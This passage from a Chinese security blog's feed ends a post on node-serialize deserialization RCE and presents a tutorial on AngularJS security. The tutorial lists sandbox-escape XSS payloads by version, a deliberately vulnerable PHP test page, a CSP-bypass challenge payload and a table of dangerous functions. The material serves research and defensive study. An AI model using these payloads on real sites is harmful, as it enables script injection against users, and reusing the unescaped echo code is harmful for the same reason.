src="/2020/03/29/node-serialize反序列化漏洞/5.png" alt=""></p><p>回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。</p><p>有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加<code>()</code>使其不是function开头呢？我们看到eval()那行代码：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/6.png" alt=""></p><p>明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上<code>()</code>即可满足IIFE的其中一种格式，从而成功RCE。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>浅析AngularJS安全</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/%E6%B5%85%E6%9E%90AngularJS%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/浅析AngularJS安全/</id>
    <published>2020-03-29T04:36:28.000Z</published>
    <updated>2020-03-29T11:03:24.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01基本概念"><a href="#0x01基本概念" class="headerlink" title="0x01基本概念"></a>0x01基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>AngularJS是一个JavaScript框架，是以一个JavaScript文件形式发布的，可通过<code>&lt;script&gt;</code>标签添加到HTML页面（通过指令扩展了HTML，且通过表达式绑定数据到HTML）。</p><p>通过<code>&lt;script&gt;</code>标签引入AngularJS的JS文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.angularjs.org/1.4.0/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>各个版本的angular.js下载： <a href="https://github.com/angular/angular.js/releases" target="_blank" rel="noopener">https://github.com/angular/angular.js/releases</a></p><p>在线版本：<a href="https://code.angularjs.org/" target="_blank" rel="noopener">https://code.angularjs.org/</a></p><p>AngularJS使得开发现代的单一页面应用程序（SPAs：Single Page Applications）变得更加容易。</p><ul><li>AngularJS把应用程序数据绑定到HTML元素。</li><li>AngularJS可以克隆和重复HTML元素。</li><li>AngularJS可以隐藏和显示HTML元素。</li><li>AngularJS可以在HTML元素”背后”添加代码。</li><li>AngularJS支持输入验证。</li></ul><h3 id="AngularJS指令"><a href="#AngularJS指令" class="headerlink" title="AngularJS指令"></a>AngularJS指令</h3><p>AngularJS通过被称为指令的新属性来扩展HTML，通过内置的指令来为应用添加功能，并且允许你自定义指令。</p><p>AngularJS指令是带有前缀<code>ng-</code>，几个常见指令如下：</p><ul><li>ng-app指令定义一个AngularJS应用程序。</li><li>ng-model指令把元素值（比如输入域的值）绑定到应用程序。</li><li>ng-bind指令把应用程序数据绑定到HTML视图。</li><li>ng-init指令初始化应用程序数据。</li></ul><h3 id="AngularJS表达式"><a href="#AngularJS表达式" class="headerlink" title="AngularJS表达式"></a>AngularJS表达式</h3><p>AngularJS使用表达式把数据绑定到HTML，其中AngularJS表达式是写在双大括号内的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; expression &#125;&#125;</span><br></pre></td></tr></table></figure><p>AngularJS表达式把数据绑定到HTML，这与ng-bind指令有异曲同工之妙。</p><p>AngularJS将在表达式书写的位置”输出”数据。</p><p><strong>与JavaScript表达式的异同点：</strong></p><ul><li>类似于JavaScript表达式，AngularJS表达式可以包含字母，操作符，变量。</li><li>与JavaScript表达式不同，AngularJS表达式可以写在HTML中。</li><li>与JavaScript表达式不同，AngularJS表达式不支持条件判断，循环及异常。</li><li>与JavaScript表达式不同，AngularJS表达式支持过滤器。</li></ul><h3 id="AngularJS应用"><a href="#AngularJS应用" class="headerlink" title="AngularJS应用"></a>AngularJS应用</h3><p>AngularJS模块（Module）定义了AngularJS应用。</p><p>AngularJS控制器（Controller）用于控制AngularJS应用。</p><p>ng-app指令指明了应用，ng-controller指明了控制器。</p><p>ng-app指令位于应用的根元素下。对于单页Web应用（single page web application，SPA），应用的根通常为html元素。</p><p>一个或多个ng-controller指令定义了应用的控制器。每个控制器有他自己的作用域：定义的HTML元素。</p><p>AngularJS在HTML DOMContentLoaded事件中自动开始。如果找到ng-app指令，AngularJS载入指令中的模块，并将ng-app作为应用的根进行编译。应用的根可以是整个页面，或者页面的一小部分，如果是一小部分会更快编译和执行。</p><h3 id="如何判断是否使用AngularJS"><a href="#如何判断是否使用AngularJS" class="headerlink" title="如何判断是否使用AngularJS"></a>如何判断是否使用AngularJS</h3><p>在当前页面F12打开Console，输入<code>angular.version</code>，若有返回版本信息则使用了：</p><p><img src="/2020/03/29/浅析AngularJS安全/3.png" alt=""></p><p>若未使用则会报错：</p><p><img src="/2020/03/29/浅析AngularJS安全/1.png" alt=""></p><h2 id="0x02-AngularJS沙箱逃逸"><a href="#0x02-AngularJS沙箱逃逸" class="headerlink" title="0x02 AngularJS沙箱逃逸"></a>0x02 AngularJS沙箱逃逸</h2><p>AngularJS是一个JavaScript框架，而针对JavaScript的Web攻击通常都是以XSS为主。</p><p>由于AngularJS沙箱的存在，使得在AngularJS框架下的字符都被自动转码。如果想执行XSS攻击，就需要绕过AngularJS沙箱，这里由于支持AngularJS表达式，因此存在表达式注入来绕过沙箱的风险。</p><p>对于可能存在XSS的地方，针对不同版本的angular需要输入不同的payload才能绕过沙箱执行XSS（一般需要确认输入字符未对<code>()&#39;</code>等特殊字符进行过滤）。</p><p>测试代码如下，angular-bypass.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$q = $_GET[&apos;q&apos;];</span><br><span class="line">echo htmlspecialchars($q,ENT_QUOTES);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>以下payload省略AngularJS表达式的标志符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>要验证输入点是否存在XSS，最简单的PoC为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2*3&#125;&#125;</span><br></pre></td></tr></table></figure><p>当响应页面包含”6”字符串时即可证明存在XSS，后面就是针对AngularJS沙箱的绕过。</p><p><img src="/2020/03/29/浅析AngularJS安全/2.png" alt=""></p><h3 id="lt-1-1-5-或-gt-1-6-0（无沙箱）"><a href="#lt-1-1-5-或-gt-1-6-0（无沙箱）" class="headerlink" title="&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）"></a>&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）</h3><p>在1.1.5版本以前是还未存在沙箱的，因此能直接触发。而由于不断被绕过沙箱，在1.6.0以后的版本，官方干脆将沙箱都给撤掉了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">constructor.constructor(&apos;alert(1)&apos;)()</span><br><span class="line">或</span><br><span class="line">[].pop.constructor(&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/4.png" alt=""></p><p><img src="/2020/03/29/浅析AngularJS安全/5.png" alt=""></p><h3 id="1-2-0-1-2-18"><a href="#1-2-0-1-2-18" class="headerlink" title="1.2.0 - 1.2.18"></a>1.2.0 - 1.2.18</h3><p>当然，下面这个payload在无沙箱的版本中也能成功执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/6.png" alt=""></p><h3 id="1-2-2-1-2-5"><a href="#1-2-2-1-2-5" class="headerlink" title="1.2.2 - 1.2.5"></a>1.2.2 - 1.2.5</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><h3 id="1-2-1-1-2-18"><a href="#1-2-1-1-2-18" class="headerlink" title="1.2.1 - 1.2.18"></a>1.2.1 - 1.2.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(_=&apos;&apos;.sub).call.call(&#123;&#125;[$=&apos;constructor&apos;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/7.png" alt=""></p><h3 id="1-2-19-1-2-23"><a href="#1-2-19-1-2-23" class="headerlink" title="1.2.19 - 1.2.23"></a>1.2.19 - 1.2.23</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/8.png" alt=""></p><h3 id="1-2-24-1-2-26"><a href="#1-2-24-1-2-26" class="headerlink" title="1.2.24 -1.2.26"></a>1.2.24 -1.2.26</h3><p>1.1.5以下版本的是ok的，但是和网上说的1.2.24 -1.2.26版本的测试却没有弹框。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;]=constructor.getOwnPropertyDescriptor;</span><br><span class="line">g=&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;];</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;]=g(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;]=constructor.defineProperty;</span><br><span class="line">d=&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;];</span><br><span class="line">d(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;,&#123;value:false&#125;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;].value(&apos;alert(1)&apos;)();</span><br></pre></td></tr></table></figure><h3 id="1-2-24-1-2-29"><a href="#1-2-24-1-2-29" class="headerlink" title="1.2.24 - 1.2.29"></a>1.2.24 - 1.2.29</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;\&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+\&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><h3 id="lt-1-2-5-或-1-2-20-1-3-20"><a href="#lt-1-2-5-或-1-2-20-1-3-20" class="headerlink" title="&lt;=1.2.5 或 1.2.20 - 1.3.20"></a>&lt;=1.2.5 或 1.2.20 - 1.3.20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.&quot;)));alert(1)//&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/9.png" alt=""></p><h3 id="1-3-0-1-3-18"><a href="#1-3-0-1-3-18" class="headerlink" title="1.3.0 - 1.3.18"></a>1.3.0 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/10.png" alt=""></p><h3 id="1-3-3-1-3-18"><a href="#1-3-3-1-3-18" class="headerlink" title="1.3.3 - 1.3.18"></a>1.3.3 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/11.png" alt=""></p><h3 id="1-3-3-1-3-19"><a href="#1-3-3-1-3-19" class="headerlink" title="1.3.3 - 1.3.19"></a>1.3.3 - 1.3.19</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:false,valueOf:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/12.png" alt=""></p><h3 id="1-4-0-1-4-5（仅Chrome）"><a href="#1-4-0-1-4-5（仅Chrome）" class="headerlink" title="1.4.0 - 1.4.5（仅Chrome）"></a>1.4.0 - 1.4.5（仅Chrome）</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;;</span><br></pre></td></tr></table></figure><h3 id="1-4-2-1-5-8（仅Chrome和IE）"><a href="#1-4-2-1-5-8（仅Chrome和IE）" class="headerlink" title="1.4.2 - 1.5.8（仅Chrome和IE）"></a>1.4.2 - 1.5.8（仅Chrome和IE）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/13.png" alt=""></p><h3 id="1-4-0-1-4-9"><a href="#1-4-0-1-4-9" class="headerlink" title="1.4.0 - 1.4.9"></a>1.4.0 - 1.4.9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/14.png" alt=""></p><h3 id="1-3-3-1-5-8"><a href="#1-3-3-1-5-8" class="headerlink" title="1.3.3 - 1.5.8"></a>1.3.3 - 1.5.8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x[&apos;y&apos;].charAt=[].join;$eval(&apos;x=alert(1)&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/15.png" alt=""></p><h3 id="1-4-10-1-6-2"><a href="#1-4-10-1-6-2" class="headerlink" title="1.4.10 - 1.6.2"></a>1.4.10 - 1.6.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">c=&apos;&apos;.sub.call;</span><br><span class="line">b=&apos;&apos;.sub.bind;</span><br><span class="line">a=&apos;&apos;.sub.apply;</span><br><span class="line">c.$apply=$apply;</span><br><span class="line">c.$eval=b;</span><br><span class="line">op=$root.$$phase;</span><br><span class="line">$root.$$phase=null;</span><br><span class="line">od=$root.$digest;</span><br><span class="line">$root.$digest=(&#123;&#125;).toString;</span><br><span class="line">C=c.$apply(c);</span><br><span class="line">$root.$$phase=op;</span><br><span class="line">$root.$digest=od;</span><br><span class="line">B=C(b,c,b);</span><br><span class="line">$evalAsync(&quot;</span><br><span class="line">astNode=pop();</span><br><span class="line">astNode.type=&apos;UnaryExpression&apos;;</span><br><span class="line">astNode.operator=&apos;(window.X?void0:(window.X=true,alert(1)))+&apos;;</span><br><span class="line">astNode.argument=&#123;type:&apos;Identifier&apos;,name:&apos;foo&apos;&#125;;</span><br><span class="line">&quot;);</span><br><span class="line">m1=B($$asyncQueue.pop().expression,null,$root);</span><br><span class="line">m2=B(C,null,m1);</span><br><span class="line">[].push.apply=m2;</span><br><span class="line">a=&apos;&apos;.sub;</span><br><span class="line">$eval(&apos;a(b.c)&apos;);</span><br><span class="line">[].push.apply=a;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/16.png" alt=""></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>第一次发布的AngularJS即 1.0 - 1.1.5 版本并没有沙箱。但AngularJS表达式被开发者限定为局部对象定义，这便阻止了在窗口对象中调用函数，由于被作用域限制，此时如果尝试调用alert会发现调用的是作用域对象而不是窗口对象，函数调用会失败。针对这种场景，Mario Heiderich发现可以使用构造函数属性来Bypass这个限制，即使用Function构造函数能在表达式中执行任意代码。</p><p>在后来的版本中AngularJS添加了沙箱，但是对应的每个版本的沙箱都被Bypass，以至于AngularJS在1.6版本之后完全移除了沙箱，也就是说新版本的AngularJS是不用再费劲去沙箱逃逸了。</p><h3 id="一道Bypass-CSP的题目"><a href="#一道Bypass-CSP的题目" class="headerlink" title="一道Bypass CSP的题目"></a>一道Bypass CSP的题目</h3><p>代码如下，bypass-csp.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        echo $_GET[&apos;q&apos;];</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到，整个HTML在AngularJS沙箱下，其中CSP限制script标签的脚本只能是加载code.angularjs.org域的或self的。</p><p>具体过程这里不做分析，payload如下（仅Chrome）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass-csp.php?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/17.png" alt=""></p><h2 id="0x03-AngularJS危险函数调用"><a href="#0x03-AngularJS危险函数调用" class="headerlink" title="0x03 AngularJS危险函数调用"></a>0x03 AngularJS危险函数调用</h2><p>AngularJS中一些特定功能的函数并不会对字符进行转码，因此当使用不当时可以执行JS表达式进行XSS攻击。</p><p>AngularJS危险函数列表如下，当然这里只列了最简单的，其他很多的请查阅资料：</p><table><thead><tr><th>危险函数</th><th>备注</th></tr></thead><tbody><tr><td>$eval()</td><td>会在当前作用域中执行一个表达式并返回结果</td></tr><tr><td>$parse()</td><td>将一个表达式转换为一个函数。这个函数可以被调用，其中的参数是一个上下文对象，通常来说是作用域。</td></tr><tr><td>trustAs(type, value)</td><td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td></tr><tr><td>trustAsHtml(type, value)</td><td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td></tr><tr><td>parseAsHtml(expression)</td><td>解析为HTML代码</td></tr><tr><td><code>angular.element(someElement).html(&quot;&lt;html&gt;&quot;+userContent);</code></td><td>DOM插入HTML</td></tr><tr><td>$sce.enabled(false);</td><td>关闭自动转义</td></tr><tr><td>$sceProvider.enabled(false);</td><td>关闭自动转义</td></tr></tbody></table><p>还有一种情况就是，  使用管道符时的条件外部可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; value | orderBy:userContent &#125;&#125;.filter(&apos;&apos;,function()&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x04-AngularJS安全措施"><a href="#0x04-AngularJS安全措施" class="headerlink" title="0x04 AngularJS安全措施"></a>0x04 AngularJS安全措施</h2><p>参考官网描述：<a href="https://angular.cn/guide/security" target="_blank" rel="noopener">https://angular.cn/guide/security</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.runoob.com/angularjs/angularjs-tutorial.html" target="_blank" rel="noopener">AngularJS 教程</a></p><p><a href="https://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="noopener">AngularJS沙盒逃逸姿势总结</a></p><p><a href="https://xz.aliyun.com/t/4638" target="_blank" rel="noopener">AngularJS Sandbox Bypasses</a></p><p><a href="https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss" target="_blank" rel="noopener">AngularJS - Escaping the Expression Sandbox for XSS</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="AngularJS" scheme="https://www.mi1k7ea.com/tags/AngularJS/"/>
    
  </entry>
  
</feed>
